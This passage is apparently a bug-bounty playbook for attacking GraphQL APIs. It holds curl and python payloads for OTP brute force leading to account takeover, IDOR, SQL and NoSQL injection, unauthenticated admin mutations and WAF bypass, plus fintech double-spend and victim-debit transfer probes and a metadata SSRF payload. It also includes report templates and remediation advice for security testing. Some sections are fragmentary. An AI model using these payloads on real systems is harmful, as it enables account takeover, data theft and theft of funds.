- **OTP bypass:** 1000 alias queries testing OTP codes in one request
- **Password reset bombing:** 100 resetPassword mutations, each with a different email

```bash

# OTP brute force via alias batching — chain with account takeover
python3 -c "
import json
mutations = []
for code in range(1000, 2000):
    mutations.append(f'v{code}: verifyOTP(code: \"{code}\", token: \"VICTIM_TOKEN\") {{ success }}')
query = '{ ' + ' '.join(mutations) + ' }'
print(json.dumps({'query': query}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

---

## 5. IDOR VIA DIRECT OBJECT ACCESS

GraphQL queries often accept IDs directly. Test whether the server enforces ownership.

# Logged in as user A (id=1) — query user B's data
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ user(id: 2) { email phone address paymentMethods { last4 } } }"}'

# Try orders, messages, invoices, appointments
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ order(id: 999) { total items { name } user { email } } }"}'
```

# Object is yours — but are ALL fields yours to read?
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ me { id email role isAdmin internalNote rawApiKey } }"}'

# Test privileged mutations on other users
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateUser(id: 2, role: \"admin\") { success } }"}'
```

# Enumerate 50 user IDs in one request
python3 -c "
import json
aliases = [f'u{i}: user(id: {i}) {{ id email role }}' for i in range(1, 51)]
print(json.dumps({'query': '{ ' + ' '.join(aliases) + ' }'}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

---

## 6. INJECTION VIA ARGUMENTS

GraphQL arguments pass directly to resolvers. Resolvers often pass them to SQL/NoSQL queries without sanitization.

# Classic SQLi probe via search/filter args
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(search: \"admin'\''--\") { id email } }"}'

# Time-based blind SQLi
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(id: \"1 AND SLEEP(5)--\") { email } }"}'

# gqlmap for automated injection
gqlmap --target https://target.com/graphql \
  --query '{ users(search: GQLMAP) { id email } }' \
  --dbms mysql
```

# MongoDB operator injection via JSON coercion
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ login(username: {\"$gt\": \"\"}, password: {\"$gt\": \"\"}) { token } }"}'

# Regex bypass
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(filter: {email: {\"$regex\": \".*\"}}) { id email } }"}'
```

# If description/bio fields render in templates
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateProfile(bio: \"{{7*7}}\") { bio } }"}'
```

---

# Try sensitive queries without any auth token
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ users { id email role } }"}'

# Try mutations without auth
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { createAdmin(email: \"test@example.com\", password: \"pass\") { id } }"}'
```

# Step 2: Call it as a regular user
curl -s -X POST https://target.com/graphql \
  -H 'Cookie: session=NORMAL_USER' \
  -d '{"query":"mutation { updateUserRole(userId: ME_ID, role: \"ADMIN\") { success } }"}'
```

# Deprecated fields are often forgotten — auth checks removed or loosened
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ userProfile(id: 2) { legacyToken adminFlags } }"}'
```

---

## 8. SUBSCRIPTION ABUSE

WebSocket-based subscriptions can leak cross-user events if not scoped per-user.

```bash

# Then: change userId to victim's ID

wscat -c wss://target.com/graphql \
  -s 'graphql-ws' \
  --execute '{"type":"start","id":"1","payload":{"query":"subscription { orderUpdated(userId: VICTIM_ID) { status total } }"}}'

# e.g. User -> friends -> User -> friends -> ...
python3 -c "
depth = 20
inner = 'id email'
for _ in range(depth):
    inner = f'friends {{ id {inner} }}'
print('{\"query\": \"{ me { ' + inner + ' } }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'

## 10. FINGERPRINTING & CVE HUNTING (graphw00f)

Different GraphQL engines have different CVEs. Fingerprint first.

```bash

# Content-type switching (some WAFs only filter application/json)
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/graphql' \
  -d '{ __schema { queryType { name } } }'

# GET introspection (WAF may only block POST)
curl -s "https://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# Comment injection to break keyword matching
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ __sch#comment\nema { queryType { name } } }"}'

# Fragment-based introspection
curl -s -X POST https://target.com/graphql \
  -d '{"query":"fragment s on __Schema { queryType { name } } query { ...s }"}'
```

---

## 13. CHAINING FINDINGS

| Chain | Severity |
|---|---|
| Introspection → find admin mutations → call without auth | Critical |
| Batching → OTP brute force → account takeover | Critical |
| Field suggestions → discover hidden field → IDOR | High |
| Alias bomb → bypass rate limit → credential stuffing | High |
| Unauthenticated subscription → real-time PII leak | High |
| Depth bomb → no query limits → DoS | Medium |
| Deprecated field → PII exposure | Medium |

---

## 14. REPORT TEMPLATE

```
Title: GraphQL [VULN TYPE] — [Impact One-liner]

Example titles:
- "GraphQL Introspection Enabled — Full Schema Disclosure on api.target.com"
- "GraphQL Batching Allows OTP Brute Force — Account Takeover via Alias Bombing"
- "GraphQL IDOR via Direct Object Queries — Access Any User's Private Data"

Endpoint: POST https://target.com/graphql

Request:
[paste raw curl or HTTP request]

Response:
[paste relevant portion of response]

Impact:
[what an attacker can actually do RIGHT NOW — no hypotheticals]

Steps to Reproduce:
1. [exact curl or Burp Repeater step]
2. [observe the response]
3. [confirm impact]

CVSS (approximate):
- Introspection only: CVSS 5.3 (Medium) — info disclosure
- IDOR cross-user: CVSS 7.5-8.5 (High)
- Batching ATO chain: CVSS 9.0+ (Critical)
- Unauthenticated mutation: CVSS 9.8 (Critical)

Remediation:
- Disable introspection in production (allow only in dev environments)
- Enforce per-query depth limit (recommend <= 10)
- Enforce complexity limits
- Disable query batching or add per-batch rate limits
- Validate object ownership in every resolver (not just at route level)
- Remove field suggestions in production
```

---

## KILL SIGNALS — Walk Away

```
- Endpoint returns 404/410 consistently — not active
- All queries return generic "Unauthorized" with no suggestions — well-hardened
- Rate limit fires on query 2 — strong protection, low ROI
- Only __typename accessible, no types — schema fully locked down
- Engine is Apollo Federation gateway only — attack the downstream services instead
```

---

## TOOLS REFERENCE

| Tool | Purpose | Install |
|---|---|---|
| `graphql_audit.sh` | Automated multi-phase sweep | this repo |
| `graphw00f` | Engine fingerprinting | `pip install graphw00f` |
| `clairvoyance` | Field discovery (no introspection) | `pip install clairvoyance` |
| `graphql-cop` | Attack checklist runner | `pip install graphql-cop` |
| `gqlmap` | SQL/NoSQL injection scanner | `pip install gqlmap` |
| `inql` | Burp Suite extension — schema + IDOR | Burp BApp Store |
| `graphql-voyager` | Visual schema explorer | browser tool |
| `wscat` | WebSocket subscription testing | `npm i -g wscat` |


### From `hunt-skills/hunt-fintech-graphql/SKILL.md`

## Why Fintech GraphQL Is a Different Risk Class

Generic GraphQL bugs (IDOR, mass assignment, introspection, batching abuse — see `hunt-graphql`)
still apply here, but the blast radius changes completely: a resolver bug in a SaaS app leaks
data, the same class of bug in a ledger mutation **moves money**. Three properties make fintech
GraphQL backends a distinct hunting surface:

- **Money-movement mutations are almost always resolvers over a double-entry ledger.** A single
  GraphQL mutation (`transferFunds`, `redeemRewards`, `withdrawToBank`) can trigger multiple
  ledger writes (debit + credit + fee) that must be atomic. GraphQL's flexible input shape and
  alias batching make it easy to desynchronize those writes.
- **Decimals are attacker-controlled input, not display formatting.** Amounts, exchange rates,
  interest, and rewards points are usually passed as GraphQL scalars (`Float`, `String`, custom
  `Decimal`/`Money` scalar). How the resolver parses and rounds that value is exploitable surface
  in its own right — this barely exists in non-financial GraphQL APIs.
- **KYC/PII fields sit next to routine account fields in the same type.** `User` or `Account`
  types commonly expose `ssnLast4`, `routingNumber`, `kycStatus`, `governmentIdUrl`, or
  `linkedBankAccount` alongside `displayName` and `email` — one missing field-level authorization
  check on a type used everywhere in the schema fans out to every query that touches it.

---

## Attack Surface Signals

**URL / schema naming patterns (in addition to `hunt-graphql`'s generic `/graphql` list):**
```
/graphql/ledger
/graphql/payments
/api/wallet/graphql
/internal/ledger-graphql
/banking/graphql
```

**Field/type names worth grepping schema introspection or JS bundles for:**
```
balance, availableBalance, pendingBalance, ledgerEntry, ledgerEntries
transferFunds, withdraw, redeem, topUp, reverseTransaction, adjustBalance
kycStatus, ssnLast4, routingNumber, accountNumber, governmentIdUrl
quoteExchangeRate, interestAccrued, rewardsPoints, portfolioValue
idempotencyKey, clientMutationId
```

**Tech-stack tells specific to this vertical:**
- Plaid/Stripe/Dwolla/Marqeta wrapped behind an internal GraphQL gateway (`bankLink`, `plaidLinkToken` mutations)
- Apollo Federation with a dedicated `ledger` or `payments` subgraph — check for the subgraph's own introspection being reachable directly, bypassing the gateway's stitched-down schema
- Custom `Money`/`Decimal`/`BigDecimal` GraphQL scalar in the schema (`scalar Money`) — the parser for this scalar is worth fuzzing directly

Run `hunt-graphql`'s discovery + introspection methodology first to get the schema; everything
below assumes you already have (or have partially enumerated) a schema with money-movement types.

---

## Step-by-Step Hunting Methodology

1. **Map every mutation that touches balance, whether directly or as a side effect.** Not just
   `transfer*`/`withdraw*` — also `redeemRewards`, `applyCoupon`, `upgradeTier`,
   `closeAccount` (often refunds a balance), `disputeTransaction` (often provisionally credits).

2. **For each money-movement mutation, identify the ledger write shape.** Does one mutation call
   produce one ledger entry or several (debit sender, credit receiver, fee entry)? Multi-entry
   writes are the ones worth racing — see Stage 4.

3. **Test idempotency-key handling.** Send the identical mutation (same `idempotencyKey` /
   `clientMutationId`) twice, back-to-back and with a delay. A ledger write on the second call
   means idempotency isn't enforced server-side — replay = double-execute.

4. **Test decimal/precision edge cases** on every amount-accepting argument — see Payload section.
   Confirm server-side rounding matches client-displayed rounding; a mismatch is directly
   monetizable.

5. **Probe cross-account IDOR on account/portfolio node IDs**, same as `hunt-idor`/`hunt-graphql`,
   but specifically test whether a `transferFunds`-style mutation validates that the
   **source account belongs to the authenticated caller** — not just that *some* account with
   that ID exists. This is the fintech-specific IDOR: authz on the *source* of a debit is easy to
   forget when authz on the *destination* of a credit was correctly implemented (crediting an
   arbitrary account "looks safe" to a developer; debiting one clearly isn't, so it gets checked
   — but sometimes only one direction does).

6. **Check field-level authorization on KYC/PII fields** by querying the shared `User`/`Account`
   type from every context that returns it — not just the profile screen. A `transaction` type
   that embeds `counterparty { ssnLast4 }` is a common place for the check to be missing, because
   the developer authorized the top-level `transaction` query but didn't re-check field access on
   the nested `counterparty`.

7. **Look for admin-tier mutations reachable via mass assignment**, not just a missing auth
   check — e.g. an input object with a client-settable `status` or `override` field that a normal
   user's mutation shouldn't expose but that the resolver accepts anyway
   (`updateTransaction(input: {id, status: "COMPLETED", amount: "..."})`).

8. **Test currency-argument consistency.** Send a transfer/quote mutation with mismatched
   `sourceCurrency`/`targetCurrency` combinations the UI never generates (e.g. self-transfer with
   a currency conversion) and check whether the resolver's FX-rate lookup and the ledger write use
   the same rate — a TOCTOU window here is a direct arbitrage bug.

9. **Combine alias batching with money-movement mutations** to test for double-spend — see
   `hunt-race-condition` for the parallel-HTTP escalation once alias batching alone confirms the
   resolver isn't serializing writes per-account.

---

## Payload & Detection Patterns

**Idempotency-key replay test:**
```graphql
mutation {
  transferFunds(input: {
    idempotencyKey: "test-key-001"
    sourceAccountId: "acc_1"
    destAccountId: "acc_2"
    amount: "10.00"
  }) { transactionId status }
}
```
Send twice with the identical `idempotencyKey`. Two successful, distinct `transactionId` values
= idempotency not enforced.

**Decimal-precision / rounding probes:**
```graphql
mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "0.001"}) { transactionId } }
mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "9999999999999999.99"}) { transactionId } }
mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "1e2"}) { transactionId } }
mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "-50.00"}) { transactionId } }
```
Sub-cent amounts test truncate-vs-round handling (repeat N times to accumulate a rounding-error
balance drift); scientific notation and oversized values test whether the `Money`/`Decimal`
scalar parser falls back to a native float/int with overflow or precision-loss behavior; negative
amounts test whether the resolver assumes sign server-side or trusts the client's.

**Alias-batched double-spend probe (confirm before escalating to parallel HTTP):**
```graphql
mutation {
  r1: redeemRewards(input: {rewardId: "rwd_1", accountId: "acc_1"}) { success }
  r2: redeemRewards(input: {rewardId: "rwd_1", accountId: "acc_1"}) { success }
  r3: redeemRewards(input: {rewardId: "rwd_1", accountId: "acc_1"}) { success }
}
```
If more than one alias succeeds against a single-use reward/coupon, the resolver doesn't
serialize per-account/per-resource writes within a batched request — see `hunt-race-condition`
for combining this with parallel HTTP POSTs to confirm real double-spend impact.

**Source-account authorization probe (asymmetric IDOR check):**
```graphql
mutation {
  transferFunds(input: {
    sourceAccountId: "VICTIM_ACCOUNT_ID"
    destAccountId: "ATTACKER_CONTROLLED_ACCOUNT_ID"
    amount: "1.00"
  }) { transactionId status }
}
```
Run as the attacker's own session/token. Success = the resolver validated the destination is
attacker-controlled (obviously required) but never validated that the source belongs to the
caller.

**Nested field-level PII probe:**
```graphql
query {
  transaction(id: "txn_123") {
    amount
    counterparty { displayName ssnLast4 routingNumber kycStatus }
  }
}
```
Query as a user with no relationship to the counterparty beyond a shared transaction; success on
the nested PII fields is the finding even if the top-level `transaction` query correctly scoped
the transaction itself.

**Mass-assignment probe on admin-shaped input fields:**
```graphql
mutation {
  updateTransaction(input: {id: "txn_123", status: "COMPLETED", amount: "0.01"}) { id status }
}
```
Send as a non-admin user against a mutation the client UI never exposes these fields for; a
schema that accepts them anyway is mass assignment onto ledger state.

---

## Common Root Causes

1. **Client-side amount/fee validation only.** The UI computes and displays the correct amount;
   the resolver trusts whatever the GraphQL client actually sends, because "the app always sends
   the right value."
2. **Non-atomic multi-entry ledger writes.** Debit, credit, and fee entries are written as
   separate sequential statements instead of inside a single transaction/lock — the race window
   this creates is exactly what alias batching + parallel HTTP exploits.
3. **`Money`/`Decimal` scalar falls back to native float parsing** under edge-case input
   (scientific notation, oversized strings), reintroducing floating-point rounding error into a
   system that was supposed to guarantee fixed-point precision.
4. **Idempotency keys are stored but never checked before executing the write** — the key is
   logged for support/debugging purposes, not used as a dedup gate.
5. **Field-level authorization implemented per top-level query, not per type.** A `User`/`Account`
   type's sensitive fields are protected when queried directly (`me { ssnLast4 }`) but not when
   the same type is returned nested inside an unrelated query (`transaction { counterparty {...} }`).
6. **Source-account ownership check missing while destination-account existence check is
   present** — see methodology step 5. Debiting looks dangerous so it gets reviewed; the "does
   this account belong to the caller" check quietly only gets applied to the credited side.
7. **Admin/internal mutations reuse the same input type as the public mutation**, just with extra
   optional fields — nothing at the resolver layer strips those fields for non-admin callers.

---

## Gate 0 Validation

Money-movement findings need a stricter bar than a typical GraphQL IDOR — "the query returns
someone else's balance" is real impact; "I sent a malformed amount and got a 400" is not.

1. **Did an actual ledger write occur, and can you show it?** Query the account balance before
   and after — a state change (not just a `200`/success response body) is the proof.
2. **Is the win deterministic, not a timing fluke?** For race/double-spend findings, reproduce
   twice from a clean state. If it only works under specific load conditions, document the window
   honestly rather than claiming guaranteed exploitability.
3. **Does the finding move value the attacker didn't have, or reveal data they shouldn't see** —
   not just "the mutation accepted an unexpected input type and the API returned an error
   message." A verbose GraphQL error leaking a stack trace on a malformed `Money` scalar is a
   `hunt-source-leak`-class finding, not a fintech-logic one — don't conflate the two in a report.

---

## Related Skills & Chains

- **`hunt-graphql`** — parent skill for generic GraphQL discovery, introspection bypass, node-ID
  IDOR, and alias-batching mechanics. Load this skill first; `hunt-fintech-graphql` assumes that
  methodology and only adds the money-movement-specific delta.
- **`hunt-business-logic`** — coupon/reward double-redemption and other logic-flaw patterns
  generalize directly to `redeemRewards`/`applyCoupon`-style mutations here.
- **`hunt-race-condition`** — the escalation path once alias batching alone confirms a
  money-movement mutation doesn't serialize writes: combine with parallel-HTTP / single-packet
  attack for a deterministic double-spend PoC.
- **`hunt-api-misconfig`** — mass assignment and JWT-claim tampering patterns apply directly to
  admin-shaped GraphQL input objects reachable by normal users.
- **`hunt-idor`** — the source-account-vs-destination-account asymmetric authz pattern (step 5) is
  a fintech-specific instance of the general IDOR-on-mutation-argument class.
- **`evidence-hygiene`** — balance screenshots and ledger-entry PoCs need the same cookie/PII
  redaction discipline as any other capture, plus care that a real account number/balance from a
  live financial account is never included verbatim.
- **`triage-validation`** — apply Gate 0 above before drafting; a fintech program's triage team
  will kill anything without a demonstrated ledger state change immediately.


### From `hunt-skills/hunt-graphql/SKILL.md`

## Crown Jewel Targets

GraphQL vulnerabilities are high-value because the attack surface is both broad and deep — a single endpoint can expose entire data models, privilege escalation paths, and cross-API state confusion. Highest payouts occur in:

- **Platform APIs** (GitHub, Shopify, Stripe-tier targets) where GraphQL mutations interact with REST APIs managing the same resources
- **Race conditions between GraphQL mutations and REST endpoints** where state synchronization is non-atomic — these hit medium-to-high severity reliably
- **Authorization persistence bugs** where team/org/repo membership state is controlled by one API but readable/writable by another
- **B2B SaaS platforms** where one tenant affecting another via schema traversal = critical
- **Internal admin GraphQL endpoints** accidentally exposed to lower-privilege users

The GitHub reports demonstrate the crown jewel pattern: **privilege that should be revoked persists because two APIs disagree on ground truth**.

---

## Attack Surface Signals

**URL Patterns:**
```
/graphql
/api/graphql
/v1/graphql
/query
/gql
/graph
/api/v2/graphql
/internal/graphql
```

**Response Headers:**
```
Content-Type: application/json  (with query body)
X-Request-Id + no REST-style path params = likely GraphQL
```

**JavaScript Source Patterns:**
```js
// grep for these in JS bundles
"query {"
"mutation {"
"__typename"
"apollo"
"ApolloClient"
"graphql-tag"
"gql`"
"operationName"
"GRAPHQL_URI"
```

**Tech Stack Signals:**
- Apollo Server/Client in JS bundles
- Relay in React apps
- `graphene` or `strawberry` (Python), `graphql-ruby`, `gqlgen` (Go), `Lighthouse` (Laravel)
- POST requests with `{"query": "..."}` body shape in Burp history
- `__schema` or `__type` in any response = confirmed GraphQL

**Recon Sources:**
- `github.com` search: `"graphql" site:target.com`
- Wayback Machine for `/graphql` paths
- JS bundle scanning with `LinkFinder` or `getallurls`

---

## Step-by-Step Hunting Methodology

1. **Discover the endpoint** — spider JS bundles, check `/graphql`, `/api/graphql`, review Burp passive scan hits for `application/json` POST with query fields

2. **Test introspection** — send the full introspection query. Even if blocked, try field-level enumeration:
   ```graphql
   { __typename }
   ```
   If that returns, introspection may be partially blocked but the schema is discoverable

3. **Map the full schema** — use `InQL` (Burp extension) or `graphql-voyager` to visualize relationships. Specifically look for:
   - Mutations that modify ownership, permissions, or membership
   - Mutations that mirror REST API functionality

4. **Identify REST/GraphQL overlap** — document every resource that can be modified via BOTH REST and GraphQL. These dual-write surfaces are your RC targets.

5. **Test authorization boundaries per mutation** — replay mutations as lower-privilege users. Does the server enforce the same authz as the equivalent REST call?

6. **Hunt cross-API state desync** — find sequences where:
   - REST action should revoke access
   - GraphQL mutation re-grants or preserves it
   - Test the ordering: REST first → GraphQL → check state; then GraphQL first → REST → check state

7. **Test for persistent privilege after role/membership changes** — remove a user via REST, then call the corresponding GraphQL mutation for that resource. Query current state via both APIs and compare.

8. **Probe for IDOR in node IDs** — GraphQL global IDs often encode object type + ID. Swap IDs across object boundaries and across account contexts.

9. **Check batch query abuse** — send arrays of operations to bypass rate limiting or amplify enumeration.

10. **Document the exact reproduction chain** — for RC bugs, time-based steps must be reproducible deterministically.

---

## Payload & Detection Patterns

**Full Introspection Query:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

**Minimal Introspection Probe (bypass attempt):**
```graphql
{ __typename }
```

**curl introspection test:**
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```

**Field suggestion probe (bypass blind introspection blocks):**
```graphql
{ unknownField }
```
If response returns `"Did you mean: [realFieldName]?"` — schema is enumerable despite introspection being disabled.

**Batch query amplification:**
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

**Subscription hijacking (cross-user channel access):**
```graphql
subscription { messageAdded(channelId: "OTHER_USERS_CHANNEL") { content sender { email } } }
```
If subscriptions lack per-user scoping, an attacker can receive real-time events from another user's channel or conversation.

**Multi-code OTP/2FA brute-force via alias batching:**
```graphql
mutation { 
  v1: verifyOtp(code:"000001"){token} 
  v2: verifyOtp(code:"000002"){token}
  v3: verifyOtp(code:"000003"){token}
}
```
A single GraphQL request aliases the same mutation with different OTP codes. Combined with parallel HTTP, this defeats per-request rate limiting and compresses brute-force attempts into fewer network round-trips.

**RC desync test pattern (pseudo-sequence):**
```bash

# Step 1: Grant access via REST
curl -X PUT https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN" \
  -d '{"permission":"admin"}'

# Step 2: Revoke via REST  
curl -X DELETE https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN"

# Step 3: Re-assert via GraphQL mutation
curl -X POST https://api.target.com/graphql \
  -H "Authorization: bearer ATTACKER_TOKEN" \
  -d '{"query":"mutation { updateTeamsRepository(input: {repositoryId: \"REPO_ID\", teamId: \"TEAM_ID\", permission: ADMIN}) { clientMutationId } }"}'

# Step 4: Verify persistent access
curl https://api.target.com/repos/ORG/REPO/teams \
  -H "Authorization: token ADMIN_TOKEN"
```

**Grep for GraphQL in JS bundles:**
```bash
grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js
grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js
```

**GraphQL introspection & audit tooling:**
```bash

# InQL (Burp extension) — visualize GraphQL schema and relationships
inql -t https://target/graphql --generate-queries

# Clairvoyance — brute-force field names when introspection is disabled
python3 clairvoyance.py -u https://target/graphql -H "Authorization: Bearer TOKEN" -w wordlist.txt -o schema.json

# GraphQL Cop — scan for common misconfigurations (introspection enabled, no depth limits, etc.)
graphql-cop -t https://target/graphql
```

---

## Common Root Causes

1. **Dual-write without atomic locking** — developers implement the same resource modification in both REST and GraphQL independently. Neither system is aware the other exists for that resource. State updates aren't serialized or compared.

2. **Inconsistent authorization middleware** — REST endpoints go through one auth layer (e.g., middleware chain), GraphQL resolvers go through a different resolver-level check. The same action, different enforcement.

3. **GraphQL as "new REST" migration** — teams add GraphQL mutations that mirror REST functionality without auditing the permission model. The GraphQL version is less mature and skips checks the REST version accumulated over time.

4. **Introspection left on in production** — default framework settings (Apollo, Graphene) enable introspection in all environments. Developers forget to disable it, treating it as "just documentation."

5. **Node ID trust without re-authorization** — GraphQL global IDs (`base64("ObjectType:123")`) are decoded and trusted without verifying the requesting user has access to that specific object.

6. **Mutation side effects not mirrored** — when a REST action triggers cascading effects (e.g., team removal cascades to permission revocation), the GraphQL equivalent mutation doesn't trigger the same cascades.

---

## Bypass Techniques

**Defense: Introspection disabled**
- Bypass via field suggestion errors — send invalid field names and parse "did you mean X?" responses
- Use `clairvoyance` to brute-force field names against a wordlist
- Check JS bundles for hardcoded query strings that reveal the schema

**Defense: Depth limiting**
- Fragment spread to increase effective depth without hitting the limiter:
```graphql
fragment F on User { repos { teams { members { ...F } } } }
```

**Defense: Rate limiting per IP**
- Use batch operations (array of queries in one POST)
- Distribute across authenticated sessions

**Defense: Auth checks on mutations**
- Test with tokens at different privilege tiers (viewer, member, admin)
- Test unauthenticated — some mutations don't check session at all
- Test with tokens from *different organizations* — multi-tenant IDOR

**Defense: WAF blocking `__schema`**
- Alias the introspection field:
```graphql
{ s: __schema { t: types { n: name } } }
```
- Use HTTP parameter pollution or alternate content-type headers

**Defense: Operation whitelisting (persisted queries)**
- Check if the server falls back to ad-hoc queries when the `extensions.persistedQuery` hash mismatches
- Look for a non-whitelisted endpoint (dev, staging, internal proxy)

### Alias batching: when it wins races vs when it doesn't

A common claim is "alias batching defeats per-user rate limits and double-spend protections." Whether this actually wins depends on the **resolver execution model**:

| Resolver type | Behavior on aliased mutations | Alias batching wins races? |
|---|---|---|
| Multi-threaded / `DataLoader`-batched async | Aliases run concurrently, share state via batch | **YES** — single HTTP request can amplify a race-target N times |
| Single-threaded / single-DB-connection per request | Aliases run serially; first mutation closes the door | **NO** — combine with parallel HTTP |
| Distributed gateway (Apollo Federation) | Sub-queries dispatched concurrently to subgraphs | Depends on each subgraph |

**Verification example (single-threaded Flask + SQLite resolver):**
- 10 aliased `redeemCoupon` mutations in one request → only `r1` succeeds, r2-r10 fail with `already_redeemed`. Alias batching alone is insufficient.
- The same 10 mutations as **20 parallel HTTP POSTs** → 20 successes ($2000 from a $100 coupon).

**Operator rule:** treat alias batching as a single-RTT recon primitive. For race-target exploitation, combine with `hunt-race-condition`'s parallel-HTTP / Turbo Intruder single-packet attack. Verified in `docs/verification/phase2e-jwt-graphql-race.md` Test 11 vs Test 12.

---

## Gate 0 Validation

1. **What can the attacker DO right now?**
   Must be a concrete action: access data they shouldn't see, retain privileges after revocation, modify another user's resources. "The schema is visible" alone is not enough — what does the schema unlock?

2. **What does the victim LOSE?**
   Must be a real asset: data confidentiality, access control integrity, org security guarantees. For the RC pattern: an org admin loses the guarantee that removing a team revokes all access. That's a security contract violation.

3. **Can it be reproduced in 10 minutes from scratch?**
   For RC/desync bugs: write the exact curl sequence. Run it twice. If the privilege persists deterministically (not timing-dependent flakiness), it's reportable. If it requires millisecond timing luck, document the window and test on low-load times.

---

## Real Impact Examples

**Scenario A — Covert Persistent Admin After Team Removal (GitHub-pattern)**
An attacker who legitimately had admin access to a repository via team membership gets removed by the org admin through the REST API. The attacker, before removal completes, calls the `updateTeamsRepository` GraphQL mutation to re-associate their team with admin permissions. The REST removal and GraphQL re-grant create a desync where the UI shows the team as removed, but the GraphQL state preserves admin-level access. The attacker retains covert write access to the repository indefinitely — pushing code, reading secrets in CI/CD — without appearing in the team's member list. This persists through org audits.

**Scenario B — Covert Access via Repo Transfer Race (GitHub-pattern)**
An attacker with admin access initiates a repository transfer to another organization via the REST API. During or after the transfer, they invoke `updateTeamsRepository` on the now-transferred repo's ID. Because the GraphQL mutation doesn't validate current org ownership state consistently with the REST transfer event, the original attacker's team retains admin access on a repo now owned by a different organization. The receiving org has no visibility into this team association. The attacker can exfiltrate intellectual property from an org they have no legitimate relationship with.

**Scenario C — Introspection as Reconnaissance Prerequisite (Shopify-pattern)**
On a platform where introspection is intentionally enabled (per-program rules), a hunter maps the full schema and discovers undocumented mutations for `fulfillmentOrderMove` and `inventoryAdjust` that are not surfaced in public docs. These mutations accept merchant IDs as arguments with no scoping validation visible in the schema. This recon directly enables targeted IDOR testing against merchant-to-merchant data isolation — the introspection itself is zero-severity, but it is the entry point to critical findings.

---

## Disclosed Report Citations (Backfill +9 — 2019-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill beyond the original 3 internal references. Each is a distinct GraphQL subclass with a working PoC documented in the cited writeup.

4. **HackerOne — Confidential user-data exposure via GraphQL `User` type** ([H1 #489146](https://hackerone.com/reports/489146))
    - Subclass: broken field-level authorization (PII exposure)
    - Payload: direct `user(id:...)` query returning `email`, `backup_codes_hash`, `facebook_user_id`, `account_recovery_phone_number_verified_at`, `totp_enabled`
    - Root cause: backend migration introduced a GraphQL `User` type with no field-level authz; any authenticated user could enumerate PII of all users
    - Year: 2019 — **$20,000**, 1,028 upvotes

5. **HackerOne — `DestroyLlmConversation` mutation IDOR (Copilot pre-release)** ([H1 #2218334](https://hackerone.com/reports/2218334))
    - Subclass: mutation IDOR on AI/LLM feature
    - Payload: `mutation { destroyLlmConversation(input:{id:"<victim_conv_id>"}) { … } }`
    - Root cause: new LLM-conversation mutation shipped without authorization decorator; any user could destroy any conversation
    - Year: 2023 — caught pre-launch, no bounty (202 upvotes)

6. **Shopify — `BillingDocumentDownload` cross-tenant IDOR** ([H1 #2207248](https://hackerone.com/reports/2207248))
    - Subclass: IDOR on relay GID across tenants
    - Payload: `query { billingDocumentDownload(id:"gid://shopify/BillingInvoice/<other_shop_id>") { url } }`
    - Root cause: `BillingInvoice` resolver authorized the requester's shop but did not verify the invoice belonged to that shop
    - Year: 2024 — **$5,000**, 175 upvotes

7. **Shopify — Rate-limit bypass via negative cost** ([H1 #481518](https://hackerone.com/reports/481518))
    - Subclass: query-cost-calc abuse (sibling pattern to alias batching)
    - Payload: `query { products(first:-100) { … } }` — negative `first` produced a negative query-cost contribution, refilling the leaky-bucket each call
    - Root cause: query-cost calculator did not floor at zero; negative values subtracted from the consumed budget
    - Year: 2019 — **$1,000**

8. **Stripe — Cross-tenant IDOR via `UpdateAtlasApplicationPerson`** ([H1 #1066203](https://hackerone.com/reports/1066203))
    - Subclass: cross-tenant IDOR on mutation
    - Payload: `mutation { updateAtlasApplicationPerson(input:{personId:"<victim_person_id>", …}) }` — adding/modifying a co-founder on another merchant's Stripe Atlas application
    - Root cause: mutation scoped only to "is admin of some merchant," not "is admin of the merchant owning this person"
    - Year: 2020 — bounty undisclosed (resolved)

9. **EXNESS — SSRF in GraphQL `allTicks` query** ([H1 #1864188](https://hackerone.com/reports/1864188))
    - Subclass: SSRF via GraphQL argument
    - Payload: `query { allTicks(source:"http://169.254.169.254/latest/meta-data/") { … } }` — `source` arg fed into a server-side HTTP client
